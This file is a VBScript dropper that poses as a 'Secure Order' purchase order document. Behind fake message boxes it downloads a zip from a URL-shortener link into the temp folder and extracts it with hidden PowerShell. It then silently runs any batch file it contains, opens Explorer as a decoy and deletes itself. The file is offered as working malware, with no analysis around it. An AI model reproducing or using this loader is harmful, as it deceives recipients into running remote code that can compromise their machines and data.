Dim password : password = "123"

MsgBox "This is Purchase Order Document." & vbCrLf & vbCrLf & "Purchase Orders Documents will open after you click OK", 0, "Secure Order"

WScript.Sleep 1000

Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim shell : Set shell = CreateObject("WScript.Shell")
Dim extractPath : extractPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\PO_Docs"

If fso.FolderExists(extractPath) Then fso.DeleteFolder extractPath, True
fso.CreateFolder extractPath

Dim zipPath : zipPath = extractPath & "\Order.zip"

If "https://ymxn7m2.short.gy/ivAdWq" <> "" Then
    Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", "https://ymxn7m2.short.gy/ivAdWq", False
    http.Send
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 : stream.Open : stream.Write http.ResponseBody : stream.SaveToFile zipPath, 2 : stream.Close
Else
    Dim stream2 : Set stream2 = CreateObject("ADODB.Stream")
    stream2.Type = 1 : stream2.Open
    stream2.Write Base64Decode("")
    stream2.SaveToFile zipPath, 2
    stream2.Close
End If

shell.Run "powershell -NoProfile -Command Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & extractPath & "' -Force", 0, True
WScript.Sleep 6000

' Flatten
Dim subF, file
For Each subF In fso.GetFolder(extractPath).SubFolders
    For Each file In subF.Files
        fso.MoveFile file.Path, extractPath & "" & file.Name
    Next
    fso.DeleteFolder subF.Path, True
Next

fso.DeleteFile zipPath

' Run BAT
Dim payload : payload = ""
Dim candidates : candidates = Array("test.bat","run.bat","start.bat","payload.bat")
Dim n
For Each n In candidates
    If fso.FileExists(extractPath & "" & n) Then payload = extractPath & "" & n : Exit For
Next
If payload = "" Then
    For Each file In fso.GetFolder(extractPath).Files
        If LCase(Right(file.Name,4)) = ".bat" Then payload = file.Path : Exit For
    Next
End If

If payload <> "" Then
    shell.Run "cmd /c start /b """" " & payload & " """"", 0, False
End If

shell.Run "explorer.exe """ & extractPath & """", 1, False

' Self-delete
fso.DeleteFile WScript.ScriptFullName, True

MsgBox "✅ Purchase Orders Documents Opened Successfully!", 0, "Complete"
WScript.Quit

Function Base64Decode(str)
    Dim xml : Set xml = CreateObject("MSXML2.DOMDocument")
    Dim node : Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str
    Base64Decode = node.nodeTypedValue
End Function
